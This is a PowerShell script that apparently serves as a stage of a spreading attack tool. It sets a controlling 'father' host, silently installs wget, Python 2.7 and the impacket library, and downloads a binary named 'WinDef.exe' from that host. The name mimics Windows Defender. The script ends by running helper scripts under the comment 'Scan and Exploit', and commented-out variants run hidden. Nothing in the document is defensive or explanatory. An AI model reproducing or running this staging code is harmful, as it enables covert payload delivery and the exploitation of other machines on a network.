# Setup
$father = '10.1.1.1'
$save_dir = $env:temp
#$save_path = '' + $save_dir + '\' + $filename;

# TODO
# Add x84 and x64 options



function get_wget {
        $filename = "wget.exe"
        $wgetBinLocation = '' + $save_dir + '\' + $filename;
        #$client = New-Object System.Net.WebClient
        #https://eternallybored.org/misc/wget/
        write-host "Downloading Wget!"
        $url = "https://eternallybored.org/misc/wget/1.20/32/wget.exe"
        (New-Object System.Net.WebClient).DownloadFile($url, $wgetBinLocation)
        return $wgetBinLocation
}



function download_file_and_install($url,$name,$wgetBinLocation){

1..1 | % {
# Downlaod
$filename = "$_" + $name
$Location = '' + $save_dir + '\' + $filename;
Start-Process -FilePath $wgetBinLocation -Args " $url -O $Location" -passthru -NoNewWindow -Wait
# Install
Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
        }
}

$wgetBinLocation = get_wget
#download_file_and_install "https://www.python.org/ftp/python/2.7/python-2.7.msi" "p.msi" $wgetBinLocation
#https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
download_file_and_install "https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi" "p.msi" $wgetBinLocation

# Get pip to download and install impacket
# Download get-pip
$Location = '' + $save_dir + '\' + 'get-pip.py';
Start-Process -FilePath $wgetBinLocation -Args " https://bootstrap.pypa.io/get-pip.py -O $Location" -passthru -NoNewWindow -Wait

python $Location
python -m pip  install impacket


# Download WinDef.exe
$Location = '' + $save_dir + '\' + 'WinDef.exe';
Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait

# Get all valid IPs
python getIPs.py
# Scan and Exploit
python scan.py


#$filename = "wget.exe"
#$Location = '' + $save_dir + '\' + $filename;
#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden
#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi" -passthru -NoNewWindow -Wait -WindowStyle hidden

#Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\2.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\3.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait

#iex "msiexec /a C:\Windows\Temp\1.msi /qb TARGETDIR=C:\python27"
